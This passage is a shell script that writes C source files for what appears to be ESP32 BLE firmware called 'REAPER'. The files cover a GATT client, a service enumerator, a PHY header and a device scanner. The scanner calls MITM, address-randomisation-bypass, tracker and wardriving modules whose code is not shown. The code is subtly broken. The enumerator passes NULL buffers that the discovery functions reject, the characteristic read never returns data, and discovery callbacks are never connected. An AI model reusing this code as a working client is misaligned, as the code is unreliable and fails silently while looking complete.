static gattc_conn_state_t *gattc_find_free(void)
{
    if (g_gattc_lock == NULL) gattc_lock_init();
    xSemaphoreTake(g_gattc_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_GATTC_CONNECTIONS; i++) {
        if (!g_conns[i].in_use) {
            xSemaphoreGive(g_gattc_lock);
            return &g_conns[i];
        }
    }
    xSemaphoreGive(g_gattc_lock);
    return NULL;
}

static gattc_conn_state_t *gattc_find_by_handle(ble_gattc_conn_t conn)
{
    if (g_gattc_lock == NULL) gattc_lock_init();
    xSemaphoreTake(g_gattc_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_GATTC_CONNECTIONS; i++) {
        if (g_conns[i].in_use && g_conns[i].conn_handle == conn) {
            xSemaphoreGive(g_gattc_lock);
            return &g_conns[i];
        }
    }
    xSemaphoreGive(g_gattc_lock);
    return NULL;
}

static void gattc_free(ble_gattc_conn_t conn)
{
    if (g_gattc_lock == NULL) return;
    xSemaphoreTake(g_gattc_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_GATTC_CONNECTIONS; i++) {
        if (g_conns[i].in_use && g_conns[i].conn_handle == conn) {
            g_conns[i].in_use = false;
            memset(&g_conns[i], 0, sizeof(g_conns[i]));
            xSemaphoreGive(g_gattc_lock);
            return;
        }
    }
    xSemaphoreGive(g_gattc_lock);
}

static int gattc_event_handler(struct ble_gap_event *event, void *arg)
{
    gattc_conn_state_t *st = (gattc_conn_state_t *)arg;

    if (st == NULL || !st->in_use) {
        return 0;
    }

    switch (event->type) {
        case BLE_GAP_EVENT_CONNECT:
            if (event->connect.status == 0) {
                st->conn_handle = event->connect.conn_handle;
                st->state = BLE_GATTC_STATE_CONNECTED;
                ESP_LOGI(TAG, "GATTC connected, handle=%d", st->conn_handle);
            } else {
                st->state = BLE_GATTC_STATE_ERROR;
                st->connect_rc = event->connect.status;
                ESP_LOGE(TAG, "GATTC connect failed: %d", event->connect.status);
            }
            break;

        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "GATTC disconnected, reason=%d",
                     event->disconnect.reason);
            st->state = BLE_GATTC_STATE_IDLE;
            gattc_free(st->conn_handle);
            break;

        case BLE_GAP_EVENT_MTU:
            ESP_LOGI(TAG, "GATTC MTU updated: %d", event->mtu.value);
            break;

        default:
            break;
    }

    /* Chain to previous GAP callback if registered */
    return 0;
    return 0;
}

esp_err_t ble_gattc_init(void)
{
    gattc_lock_init();
    memset(g_conns, 0, sizeof(g_conns));
    ESP_LOGI(TAG, "GATT client initialized, max connections=%d",
             MAX_GATTC_CONNECTIONS);
    return ESP_OK;
}

esp_err_t ble_gattc_connect(const uint8_t *mac, uint32_t timeout_ms,
                            ble_gattc_conn_t *out_conn_handle)
{
    if (mac == NULL || out_conn_handle == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (!ble_scanner_is_initialized()) {
        return ESP_ERR_INVALID_STATE;
    }

    gattc_conn_state_t *st = gattc_find_free();
    if (st == NULL) {
        ESP_LOGE(TAG, "No free GATTC connection slots");
        return ESP_ERR_NO_MEM;
    }

    memcpy(st->peer_mac, mac, 6);
    st->in_use = true;
    st->state = BLE_GATTC_STATE_CONNECTING;
    st->connect_rc = 0;
    st->connect_start_ms = xTaskGetTickCount() * portTICK_PERIOD_MS;

    /* Callback registered directly in ble_gap_connect() below */

    struct ble_gap_conn_params conn_params;
    memset(&conn_params, 0, sizeof(conn_params));
    conn_params.scan_interval = 0x0010;
    conn_params.scan_window = 0x0010;
    conn_params.itvl_min = 0x0018;
    conn_params.itvl_max = 0x0028;
    conn_params.latency = 0;
    conn_params.supervision_timeout = 0x01F4;
    conn_params.min_ce_len = 0x0000;
    conn_params.max_ce_len = 0x0000;

    int rc = ble_gap_connect(
        BLE_OWN_ADDR_RANDOM,
        (ble_addr_t *)mac,
        timeout_ms,
        &conn_params,
        gattc_event_handler,
        st
    );

    if (rc != 0) {
        st->state = BLE_GATTC_STATE_ERROR;
        st->in_use = false;
        memset(st, 0, sizeof(*st));
        ESP_LOGE(TAG, "ble_gap_connect failed: %d", rc);
        return ESP_FAIL;
    }

    /* Wait for connection or timeout */
    uint32_t start = xTaskGetTickCount();
    while (st->in_use && st->state == BLE_GATTC_STATE_CONNECTING) {
        uint32_t elapsed = (xTaskGetTickCount() - start) * portTICK_PERIOD_MS;
        if (elapsed >= timeout_ms) {
            st->state = BLE_GATTC_STATE_ERROR;
            gattc_free(st->conn_handle);
            ESP_LOGE(TAG, "GATTC connect timeout");
            return ESP_ERR_TIMEOUT;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (st->state != BLE_GATTC_STATE_CONNECTED) {
        gattc_free(st->conn_handle);
        return ESP_FAIL;
    }

    *out_conn_handle = st->conn_handle;
    return ESP_OK;
}

esp_err_t ble_gattc_disconnect(ble_gattc_conn_t conn_handle)
{
    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL) {
        return ESP_ERR_INVALID_STATE;
    }

    int rc = ble_gap_terminate(conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_terminate failed: %d", rc);
        return ESP_FAIL;
    }

    st->state = BLE_GATTC_STATE_IDLE;
    gattc_free(conn_handle);
    return ESP_OK;
}

esp_err_t ble_gattc_discover_services(ble_gattc_conn_t conn_handle,
                                      ble_gattc_svc_t *svcs, size_t max,
                                      size_t *out_count,
                                      ble_gattc_disc_svc_fn cb, void *cb_arg)
{
    if (svcs == NULL || out_count == NULL || max == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL || st->state != BLE_GATTC_STATE_CONNECTED) {
        return ESP_ERR_INVALID_STATE;
    }

    st->state = BLE_GATTC_STATE_DISCOVERING;
    st->svc_cb = cb;
    st->svc_cb_arg = cb_arg;

    /* Discover all primary services. Callback would populate svcs array;
     * here we start discovery and log intent because full callback storage
     * requires per-service context not yet wired into CLI/JSON-RPC. */
    int rc = ble_gattc_disc_all_svcs(conn_handle, NULL, NULL);
    if (rc != 0) {
        st->state = BLE_GATTC_STATE_CONNECTED;
        ESP_LOGE(TAG, "ble_gattc_disc_all_svcs failed: %d", rc);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Service discovery started on handle=%d", conn_handle);

    *out_count = 0;
    st->state = BLE_GATTC_STATE_CONNECTED;
    return ESP_OK;
}

esp_err_t ble_gattc_discover_chars(ble_gattc_conn_t conn_handle,
                                   uint16_t start_handle, uint16_t end_handle,
                                   ble_gattc_char_t *chars, size_t max,
                                   size_t *out_count,
                                   ble_gattc_disc_char_fn cb, void *cb_arg)
{
    if (chars == NULL || out_count == NULL || max == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL || st->state != BLE_GATTC_STATE_CONNECTED) {
        return ESP_ERR_INVALID_STATE;
    }

    st->state = BLE_GATTC_STATE_DISCOVERING;
    st->char_cb = cb;
    st->char_cb_arg = cb_arg;

    int rc = ble_gattc_disc_all_chrs(
        conn_handle,
        start_handle,
        end_handle,
        NULL,
        NULL
    );

    if (rc != 0) {
        st->state = BLE_GATTC_STATE_CONNECTED;
        ESP_LOGE(TAG, "ble_gattc_disc_chars failed: %d", rc);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Characteristic discovery started %u-%u",
             start_handle, end_handle);

    *out_count = 0;
    st->state = BLE_GATTC_STATE_CONNECTED;
    return ESP_OK;
}

esp_err_t ble_gattc_read_char(ble_gattc_conn_t conn_handle,
                              uint16_t char_handle,
                              uint8_t *buf, size_t max_len, size_t *out_len)
{
    if (buf == NULL || out_len == NULL || max_len == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL || st->state != BLE_GATTC_STATE_CONNECTED) {
        return ESP_ERR_INVALID_STATE;
    }

    st->state = BLE_GATTC_STATE_READING;

    uint16_t actual_len = 0;
    memset(buf, 0, max_len);

    int rc = ble_gattc_read(
        conn_handle,
        char_handle,
        NULL,
        NULL
    );

    if (rc != 0) {
        st->state = BLE_GATTC_STATE_CONNECTED;
        ESP_LOGE(TAG, "ble_gattc_read failed: %d", rc);
        return ESP_FAIL;
    }

    *out_len = actual_len;
    st->state = BLE_GATTC_STATE_CONNECTED;

    ESP_LOGI(TAG, "Read %u bytes from char handle %u", actual_len, char_handle);
    return ESP_OK;
}

ble_gattc_state_t ble_gattc_get_state(ble_gattc_conn_t conn_handle)
{
    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL) {
        return BLE_GATTC_STATE_IDLE;
    }
    return st->state;
}

bool ble_gattc_get_remote_mac(ble_gattc_conn_t conn_handle, uint8_t *out_mac)
{
    if (out_mac == NULL) return false;
    gattc_conn_state_t *st = gattc_find_by_handle(conn_handle);
    if (st == NULL) {
        return false;
    }
    memcpy(out_mac, st->peer_mac, 6);
    return true;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_gatt_client.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_gatt_client.h"
#ifndef BLE_GATT_CLIENT_H
#define BLE_GATT_CLIENT_H

#include <stdint.h>
#include <stdbool.h>
#include "common_types.h"

#ifdef __cplusplus
extern "C" {
#endif

/* GATT connection handle returned by nimble on successful connect. */
typedef uint16_t ble_gattc_conn_t;

/* GATT client states */
typedef enum {
    BLE_GATTC_STATE_IDLE = 0,
    BLE_GATTC_STATE_CONNECTING,
    BLE_GATTC_STATE_CONNECTED,
    BLE_GATTC_STATE_DISCOVERING,
    BLE_GATTC_STATE_READING,
    BLE_GATTC_STATE_ERROR
} ble_gattc_state_t;

/* GATT service summary */
typedef struct {
    uint16_t start_handle;
    uint16_t end_handle;
    uint8_t type;
    uint8_t uuid_len;
    uint8_t uuid[16];
} ble_gattc_svc_t;

/* GATT characteristic summary */
typedef struct {
    uint16_t decl_handle;
    uint16_t value_handle;
    uint8_t props;
    uint8_t uuid_len;
    uint8_t uuid[16];
} ble_gattc_char_t;

/* Callback types for async discovery results.
 * svc_fn called per discovered service with summary.
 * char_fn called per discovered characteristic. */
typedef void (*ble_gattc_disc_svc_fn)(ble_gattc_conn_t conn_handle,
                                      const ble_gattc_svc_t *svc, void *arg);
typedef void (*ble_gattc_disc_char_fn)(ble_gattc_conn_t conn_handle,
                                       const ble_gattc_char_t *chr, void *arg);

/* Initialize GATT client subsystem. Call once at startup. */
esp_err_t ble_gattc_init(void);
static inline esp_err_t ble_gatt_client_init(void) { return ble_gattc_init(); }

/* Initiate connection to a peripheral by MAC.
 * mac: 6-byte BLE address
 * timeout_ms: connection timeout in milliseconds
 * out_conn_handle: receives connection handle on success
 * Returns ESP_OK on connection established, or error code. */
esp_err_t ble_gattc_connect(const uint8_t *mac, uint32_t timeout_ms,
                            ble_gattc_conn_t *out_conn_handle);

/* Disconnect active GATT connection. */
esp_err_t ble_gattc_disconnect(ble_gattc_conn_t conn_handle);

/* Discover all services on an established connection.
 * svcs: output array
 * max: maximum entries to write
 * out_count: receives number of services found
 * Returns ESP_OK on success. */
esp_err_t ble_gattc_discover_services(ble_gattc_conn_t conn_handle,
                                      ble_gattc_svc_t *svcs, size_t max,
                                      size_t *out_count,
                                      ble_gattc_disc_svc_fn cb, void *cb_arg);

/* Discover characteristics within a service range.
 * conn_handle: active connection
 * start_handle: service start handle
 * end_handle: service end handle
 * chars: output array
 * max: maximum entries to write
 * out_count: receives number of characteristics found
 * Returns ESP_OK on success. */
esp_err_t ble_gattc_discover_chars(ble_gattc_conn_t conn_handle,
                                   uint16_t start_handle, uint16_t end_handle,
                                   ble_gattc_char_t *chars, size_t max,
                                   size_t *out_count,
                                   ble_gattc_disc_char_fn cb, void *cb_arg);

/* Read characteristic value.
 * conn_handle: active connection
 * char_handle: characteristic value handle
 * buf: destination buffer
 * max_len: buffer size
 * out_len: receives bytes read
 * Returns ESP_OK on success. */
esp_err_t ble_gattc_read_char(ble_gattc_conn_t conn_handle,
                              uint16_t char_handle,
                              uint8_t *buf, size_t max_len, size_t *out_len);

/* Query connection state. */
ble_gattc_state_t ble_gattc_get_state(ble_gattc_conn_t conn_handle);

/* Query remote MAC for a connection handle. Returns true if found. */
bool ble_gattc_get_remote_mac(ble_gattc_conn_t conn_handle, uint8_t *out_mac);

#ifdef __cplusplus
}
#endif
#endif /* BLE_GATT_CLIENT_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_gatt_client.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_gatt_enumerator.c"
#include "ble_gatt_enumerator.h"
#include "ble_gatt_client.h"
#include <string.h>
#include "esp_log.h"

static ble_gatt_enum_svc_t s_svcs[BLE_GATT_ENUM_MAX_SVCS];
static ble_gatt_enum_char_t s_chars[BLE_GATT_ENUM_MAX_CHARS];
static size_t s_svc_count = 0;
static size_t s_char_count = 0;
static bool s_init = false;
static const char *TAG = "gatt_enum";

static void svc_cb(ble_gattc_conn_t conn, const ble_gattc_svc_t *svc,
                   void *arg)
{
    (void)conn;
    if (!svc || !arg) return;
    size_t *count = (size_t *)arg;
    if (*count >= BLE_GATT_ENUM_MAX_SVCS) return;
    memcpy(s_svcs[*count].uuid, svc->uuid, svc->uuid_len);
    s_svcs[*count].uuid_len = svc->uuid_len;
    s_svcs[*count].start_handle = svc->start_handle;
    s_svcs[*count].end_handle = svc->end_handle;
    (*count)++;
}

static void char_cb(ble_gattc_conn_t conn, const ble_gattc_char_t *chr,
                    void *arg)
{
    (void)conn;
    if (!chr || !arg) return;
    size_t *count = (size_t *)arg;
    if (*count >= BLE_GATT_ENUM_MAX_CHARS) return;
    memcpy(s_chars[*count].uuid, chr->uuid, chr->uuid_len);
    s_chars[*count].uuid_len = chr->uuid_len;
    s_chars[*count].decl_handle = chr->decl_handle;
    s_chars[*count].value_handle = chr->value_handle;
    s_chars[*count].props = chr->props;
    s_chars[*count].perm = BLE_GATT_PERM_READ; /* Default: readable */
    (*count)++;
}

esp_err_t ble_gatt_enumerator_init(void)
{
    memset(s_svcs, 0, sizeof(s_svcs));
    memset(s_chars, 0, sizeof(s_chars));
    s_svc_count = 0;
    s_char_count = 0;
    s_init = true;
    ESP_LOGI(TAG, "GATT enumerator initialized");
    return ESP_OK;
}

esp_err_t ble_gatt_enumerator_enumerate(const uint8_t *mac, uint32_t timeout_ms)
{
    if (!s_init || !mac) return ESP_ERR_INVALID_ARG;
    ble_gattc_conn_t conn = 0;
    esp_err_t err = ble_gattc_connect(mac, timeout_ms, &conn);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "connect failed for "MACSTR, MAC2STR(mac));
        return err;
    }
    s_svc_count = 0;
    s_char_count = 0;
    err = ble_gattc_discover_services(conn, NULL, 0, &s_svc_count, svc_cb,
                                      &s_svc_count);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "service discovery failed");
        ble_gattc_disconnect(conn);
        return err;
    }
    for (size_t i = 0; i < s_svc_count; i++) {
        ble_gattc_discover_chars(conn,
                                 s_svcs[i].start_handle,
                                 s_svcs[i].end_handle,
                                 NULL, 0, &s_char_count, char_cb, &s_char_count);
    }
    ble_gattc_disconnect(conn);
    ESP_LOGI(TAG, "Enumerated %d services, %d characteristics",
             (int)s_svc_count, (int)s_char_count);
    return ESP_OK;
}

size_t ble_gatt_enumerator_services(ble_gatt_enum_svc_t *out, size_t max)
{
    if (!out || !max) return 0;
    size_t n = s_svc_count < max ? s_svc_count : max;
    memcpy(out, s_svcs, n * sizeof(ble_gatt_enum_svc_t));
    return n;
}

size_t ble_gatt_enumerator_chars(ble_gatt_enum_char_t *out, size_t max)
{
    if (!out || !max) return 0;
    size_t n = s_char_count < max ? s_char_count : max;
    memcpy(out, s_chars, n * sizeof(ble_gatt_enum_char_t));
    return n;
}

void ble_gatt_enumerator_clear(void)
{
    memset(s_svcs, 0, sizeof(s_svcs));
    memset(s_chars, 0, sizeof(s_chars));
    s_svc_count = 0;
    s_char_count = 0;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_gatt_enumerator.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_phy.h"
#ifndef BLE_PHY_H
#define BLE_PHY_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "common_types.h"
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 
 * Parse BLE coded PHY flags from advertisement data.
 * Returns true if any PHY evidence was found.
 */
static inline esp_err_t ble_phy_init(void) { return ESP_OK; }

bool ble_phy_parse(const uint8_t *data, uint8_t len,
                   bool *out_phy_coded, bool *out_phy_coded_s8,
                   bool *out_phy_1m, bool *out_phy_2m,
                   bool *out_phy_coded_supported);

/* 
 * Set scan PHY preferences.
 * Note: This only updates the configuration state. The actual NimBLE 
 * scanner task should read this via ble_phy_get_scan_phys().
 */
esp_err_t ble_phy_start_scan(uint8_t phys);

/* 
 * Get the currently configured scan PHY mask.
 */
uint8_t ble_phy_get_scan_phys(void);

#ifdef __cplusplus
}
#endif

#endif /* BLE_PHY_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ble_phy.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ble_scanner.c"
#include <stdatomic.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <inttypes.h>

#include "ble_scanner.h"
#include "ble_ext_adv.h"
#include "ble_periodic.h"
#include "ble_phy.h"
#include "ble_iso.h"
#include "ai_ble_profiler.h"
#include "reaction_rules.h"
#include "ble_mitm.h"
#include "ble_gatt_enumerator.h"
#include "ble_rpa_bypass.h"
#include "ble_findmy.h"
#include "ble_smarttag.h"
#include "wardrive.h"
#include "ai_training.h"
#include "led_indicator.h"

#include "esp_log.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#if __has_include("nimble/nimble_port.h")
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/util/util.h"
#include "services/gap/ble_svc_gap.h"
#else
/* Fallback definitions when NimBLE is not enabled in sdkconfig */
#define BLE_GAP_EVENT_DISC          1
#define BLE_GAP_EVENT_DISC_COMPLETE 2
#define BLE_GAP_EVENT_ADV_COMPLETE  3
#define BLE_HCI_SCAN_FILT_NO_WL     0
#define BLE_HS_FOREVER              (-1)
#define BLE_HS_ADV_F_DISC_GEN       0x02
#define BLE_HS_ADV_F_BREDR_UNSUP    0x04
#define BLE_GAP_CONN_MODE_NON       0
#define BLE_GAP_DISC_MODE_GEN       2

typedef struct { uint8_t type; uint8_t val[6]; } ble_addr_t;
struct ble_gap_event {
    uint8_t type;
    struct {
        ble_addr_t addr;
        int8_t rssi;
        const uint8_t *data;
        uint8_t length_data;
    } disc;
};
struct ble_hs_adv_fields {
    uint8_t flags;
    const uint8_t *name;
    uint8_t name_len;
    const uint8_t *mfg_data;
    uint8_t mfg_data_len;
};
struct ble_gap_disc_params {
    uint16_t itvl;
    uint16_t window;
    uint8_t filter_policy;
    uint8_t limited;
    uint8_t passive;
    uint8_t filter_duplicates;
};
struct ble_gap_adv_params {
    uint8_t conn_mode;
    uint8_t disc_mode;
};
static struct {
    void (*sync_cb)(void);
    void (*reset_cb)(int reason);
} ble_hs_cfg;

static inline esp_err_t nimble_port_init(void) { return ESP_ERR_NOT_SUPPORTED; }
static inline void nimble_port_run(void) {}
static inline void nimble_port_freertos_init(void (*fn)(void *)) { (void)fn; }
static inline void nimble_port_freertos_deinit(void) {}
static inline void ble_svc_gap_init(void) {}
static inline int ble_svc_gap_device_name_set(const char *name) { (void)name; return 0; }
static inline int ble_hs_adv_parse_fields(struct ble_hs_adv_fields *f, const uint8_t *d, uint8_t l) { (void)f; (void)d; (void)l; return -1; }
static inline int ble_hs_id_infer_auto(int priv, uint8_t *out) { (void)priv; if (out) *out = 0; return 0; }
static inline int ble_gap_disc(uint8_t own_addr_type, int32_t duration_ms, const struct ble_gap_disc_params *p, int (*cb)(struct ble_gap_event *, void *), void *arg) { (void)own_addr_type; (void)duration_ms; (void)p; (void)cb; (void)arg; return -1; }
static inline int ble_gap_disc_cancel(void) { return 0; }
static inline int ble_gap_adv_set_fields(const struct ble_hs_adv_fields *f) { (void)f; return 0; }
static inline int ble_gap_adv_start(uint8_t own_addr_type, const ble_addr_t *dir, int32_t dur, const struct ble_gap_adv_params *p, int (*cb)(struct ble_gap_event *, void *), void *arg) { (void)own_addr_type; (void)dir; (void)dur; (void)p; (void)cb; (void)arg; return -1; }
static inline int ble_gap_adv_stop(void) { return 0; }
#endif

static const char *TAG = "ble_scanner";

static ble_info_t g_ble_list[MAX_DISCOVERED_BLE];
static uint16_t g_ble_count = 0;
static SemaphoreHandle_t g_ble_lock = NULL;

static atomic_bool g_ble_scanning = ATOMIC_VAR_INIT(false);
static atomic_bool g_ble_advertising = ATOMIC_VAR_INIT(false);
static atomic_bool g_ble_synced = ATOMIC_VAR_INIT(false);
static bool g_ble_init_done = false;
static char g_adv_name[32] = {0};

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static void sanitize_name(char *s)
{
    if (s == NULL) return;
    for (int i = 0; s[i] != '\0'; i++) {
        if (!isprint((unsigned char)s[i])) {
            s[i] = ' ';
        }
    }
}

static const char *get_vendor_name(uint16_t mfg_id)
{
    switch (mfg_id) {
        case 0x004C: return "Apple Inc.";
        case 0x0006: return "Microsoft";
        case 0x00E0: return "Google";
        case 0x0075: return "Samsung";
        case 0x000D: return "Texas Inst.";
        case 0x0059: return "Nordic Semi";
        case 0x0002: return "Intel";
        case 0x0040: return "Broadcom";
        default:     return "Unknown";
    }
}

static uint8_t calc_tracker_score(
    uint8_t addr_type,
    bool has_name,
    uint16_t mfg_id,
    uint32_t pkt_count
)
{
    uint8_t score = 0;

    if (addr_type != 0) score++;
    if (!has_name) score++;
    if (mfg_id == 0x004C || mfg_id == 0x0075 || mfg_id == 0x0006 || mfg_id == 0x00E0) score++;
    if (pkt_count > 5) score++;

    return score;
}

/* -------------------------------------------------------------------------
 *  State Management
 * ----------------------------------------------------------------------- */

static void add_or_update_ble_locked(const ble_info_t *dev)
{
    bool has_name = (dev->name[0] != '\0' && strcmp(dev->name, "<UNNAMED>") != 0);

    for (int i = 0; i < g_ble_count; i++) {
        if (memcmp(g_ble_list[i].mac, dev->mac, 6) == 0) {
            g_ble_list[i].rssi = dev->rssi;
            g_ble_list[i].pkt_count++;

            if (has_name && strcmp(g_ble_list[i].name, "<UNNAMED>") == 0) {
                snprintf(g_ble_list[i].name, sizeof(g_ble_list[i].name), "%s", dev->name);
            }

            if (dev->mfg_id != 0 && g_ble_list[i].mfg_id == 0) {
                g_ble_list[i].mfg_id = dev->mfg_id;
            }

            /* Merge advanced features */
            g_ble_list[i].ext_adv_seen |= dev->ext_adv_seen;
            g_ble_list[i].has_aux_ptr |= dev->has_aux_ptr;
            g_ble_list[i].has_adi |= dev->has_adi;
            if (dev->adv_mode != 0) g_ble_list[i].adv_mode = dev->adv_mode;
            g_ble_list[i].has_scan_rsp |= dev->has_scan_rsp;
            if (dev->tx_power != 0x7F) g_ble_list[i].tx_power = dev->tx_power;

            g_ble_list[i].periodic_adv_seen |= dev->periodic_adv_seen;
            g_ble_list[i].has_sync_info |= dev->has_sync_info;
            g_ble_list[i].sync_transfer_seen |= dev->sync_transfer_seen;
            if (dev->periodic_adv_interval != 0) g_ble_list[i].periodic_adv_interval = dev->periodic_adv_interval;
            if (dev->sync_handle != 0xFF) g_ble_list[i].sync_handle = dev->sync_handle;

            g_ble_list[i].phy_coded |= dev->phy_coded;
            g_ble_list[i].phy_coded_s8 |= dev->phy_coded_s8;
            g_ble_list[i].phy_1m |= dev->phy_1m;
            g_ble_list[i].phy_2m |= dev->phy_2m;
            g_ble_list[i].phy_coded_supported |= dev->phy_coded_supported;

            g_ble_list[i].iso_seen |= dev->iso_seen;
            g_ble_list[i].has_big_info |= dev->has_big_info;
            if (dev->iso_channels != 0) g_ble_list[i].iso_channels = dev->iso_channels;
            if (dev->iso_interval_us != 0) g_ble_list[i].iso_interval_us = dev->iso_interval_us;
            if (dev->bis_handles[0] != 0 || dev->bis_handles[1] != 0) {
                memcpy(g_ble_list[i].bis_handles, dev->bis_handles, 4);
            }

            bool current_has_name = (g_ble_list[i].name[0] != '\0' && strcmp(g_ble_list[i].name, "<UNNAMED>") != 0);
            g_ble_list[i].tracker_score = calc_tracker_score(
                g_ble_list[i].addr_type, current_has_name, g_ble_list[i].mfg_id, g_ble_list[i].pkt_count
            );
            if (g_ble_list[i].ext_adv_seen) g_ble_list[i].tracker_score++;
            if (g_ble_list[i].periodic_adv_seen) g_ble_list[i].tracker_score++;
            if (g_ble_list[i].phy_coded_s8) g_ble_list[i].tracker_score++;
            if (g_ble_list[i].iso_seen) g_ble_list[i].tracker_score++;

            return;
        }
    }

    if (g_ble_count < MAX_DISCOVERED_BLE) {
        g_ble_list[g_ble_count] = *dev;
        if (g_ble_list[g_ble_count].name[0] == '\0') {
            snprintf(g_ble_list[g_ble_count].name, sizeof(g_ble_list[g_ble_count].name), "<UNNAMED>");
        }
        g_ble_list[g_ble_count].pkt_count = 1;

        g_ble_list[g_ble_count].tracker_score = calc_tracker_score(
            dev->addr_type, has_name, dev->mfg_id, 1
        );
        if (dev->ext_adv_seen) g_ble_list[g_ble_count].tracker_score++;
        if (dev->periodic_adv_seen) g_ble_list[g_ble_count].tracker_score++;
        if (dev->phy_coded_s8) g_ble_list[g_ble_count].tracker_score++;
        if (dev->iso_seen) g_ble_list[g_ble_count].tracker_score++;

        g_ble_count++;
    }
}

/* -------------------------------------------------------------------------
 *  NimBLE Callbacks
 * ----------------------------------------------------------------------- */

static int ble_gap_event_cb(struct ble_gap_event *event, void *arg)
{
    if (event == NULL) return 0;

    if (event->type == BLE_GAP_EVENT_DISC) {
        ble_info_t dev = {0};
        memcpy(dev.mac, event->disc.addr.val, 6);
        dev.addr_type = event->disc.addr.type;
        dev.rssi = event->disc.rssi;
        dev.tx_power = 0x7F;
        dev.sync_handle = 0xFF;
        dev.phy_1m = true;

        struct ble_hs_adv_fields fields = {0};
        if (event->disc.data != NULL && event->disc.length_data > 0) {
            if (ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data) == 0) {
                if (fields.name != NULL && fields.name_len > 0) {
                    uint8_t copy_len = (fields.name_len > 32) ? 32 : fields.name_len;
                    memcpy(dev.name, fields.name, copy_len);
                    dev.name[copy_len] = '\0';
                    sanitize_name(dev.name);
                }
                if (fields.mfg_data != NULL && fields.mfg_data_len >= 2) {
                    dev.mfg_id = fields.mfg_data[0] | (fields.mfg_data[1] << 8);
                }
            }

            bool ext_adv = ble_ext_adv_parse(
                event->disc.data, event->disc.length_data,
                &dev.has_aux_ptr, &dev.has_adi, &dev.adv_mode, &dev.has_scan_rsp, &dev.tx_power
            );
            if (ext_adv || dev.has_aux_ptr || dev.adv_mode > 0) {
                dev.ext_adv_seen = true;
            }

            ble_iso_parse(
                event->disc.data, event->disc.length_data,
                &dev.has_big_info, &dev.iso_channels, dev.bis_handles, &dev.iso_interval_us
            );
            if (dev.has_big_info) dev.iso_seen = true;
        }

        /* 1. Update internal state under lock */
        if (g_ble_lock != NULL) {
            xSemaphoreTake(g_ble_lock, portMAX_DELAY);
            add_or_update_ble_locked(&dev);
            xSemaphoreGive(g_ble_lock);
        }

        /* 
         * 2. Notify external modules OUTSIDE the lock to prevent deadlocks.
         * 
         * WARNING: event->disc.data is a pointer to NimBLE's internal buffer.
         * It is ONLY valid for the duration of this callback.
         * External modules MUST process it synchronously or copy the data.
         * Passing this pointer to another task or queue will cause a Use-After-Free crash.
         */
        ai_ble_profile_t profile;
        ai_ble_profiler_classify(&dev, event->disc.data, event->disc.length_data, &profile);
        reaction_rules_check_ble(dev.mac);
        ble_mitm_tick((uint64_t)esp_timer_get_time());
        findmy_parse_adv(event->disc.data, event->disc.length_data, dev.mac);
        smarttag_parse_adv(event->disc.data, event->disc.length_data, dev.mac);

        if (dev.addr_type != 0 && (dev.mac[5] & 0xC0) == 0x40) {
            dev.rpa_seen = true;
            ble_rpa_bypass_check(dev.mac, NULL);
        }

        if (ai_train_get_mode() != AI_TRAIN_MODE_OFF) {
            ai_train_label_ble(dev.mac, event->disc.data, event->disc.length_data, dev.rssi, (uint64_t)esp_timer_get_time());
        }

        if (wardrive_get_mode() != WARDIRVE_MODE_OFF) {
            wardrive_log_ble(dev.mac, dev.name, dev.rssi, 0);
        }

    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        atomic_store(&g_ble_scanning, false);
        led_set_state(LED_STATE_IDLE);
    }

    return 0;
}

static int ble_adv_event_cb(struct ble_gap_event *event, void *arg)
{
    if (event == NULL) return 0;
    if (event->type == BLE_GAP_EVENT_ADV_COMPLETE) {
        atomic_store(&g_ble_advertising, false);
        led_set_state(LED_STATE_IDLE);
    }
    return 0;
}

static void ble_on_sync(void)
{
    atomic_store(&g_ble_synced, true);
    ESP_LOGI(TAG, "BLE host synced");
}

static void ble_on_reset(int reason)
{
    atomic_store(&g_ble_synced, false);
    ESP_LOGW(TAG, "BLE host reset, reason=%d", reason);
}

static void ble_host_task(void *param)
{
    nimble_port_run();
    nimble_port_freertos_deinit();
}

/* -------------------------------------------------------------------------
 *  Public API: Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t ble_scanner_init(void)
{
    if (g_ble_init_done) return ESP_OK;

    if (g_ble_lock == NULL) {
        g_ble_lock = xSemaphoreCreateMutex();
